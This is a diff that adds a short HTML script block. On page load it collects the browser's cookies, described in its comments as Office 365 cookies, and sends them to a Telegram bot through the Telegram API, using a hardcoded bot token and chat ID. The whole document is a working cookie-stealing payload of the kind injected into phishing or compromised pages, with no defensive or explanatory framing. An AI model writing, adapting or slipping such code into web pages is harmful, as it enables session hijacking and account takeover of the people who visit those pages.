@@ -1,0 +1,54 @@
+<script type="text/javascript">
+
+
+
+// JavaScript code to pack and send Office 365 cookies to Telegram
+
+// Function to retrieve cookies from the browser
+function getCookies() {
+  const cookies = document.cookie.split(';');
+  const cookieObject = {};
+
+  cookies.forEach(cookie => {
+    const [name, value] = cookie.trim().split('=');
+    cookieObject[name] = value;
+  });
+
+  return cookieObject;
+}
+
+// Function to send cookies to Telegram bot
+function sendCookiesToTelegram(cookies) {
+  const telegramBotToken = '6848819763:AAEFWzRagLNU_WMXE91QfEy0kdRHJH1ZuNA'; // Replace with your actual bot token
+  const chatId = '6965372099'; // Replace with the chat ID where you want to send the cookies
+
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+  const data = {
+    chat_id: chatId,
+    text: JSON.stringify(cookies),
+    parse_mode: 'Markdown'
+  };
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Cookies sent to Telegram:', data);
+  })
+  .catch(error => {
+    console.error('Error sending cookies to Telegram:', error);
+  });
+}
+
+// Retrieve Office 365 cookies
+const office365Cookies = getCookies();
+
+// Send cookies to Telegram bot
+sendCookiesToTelegram(office365Cookies);
+
+</script>
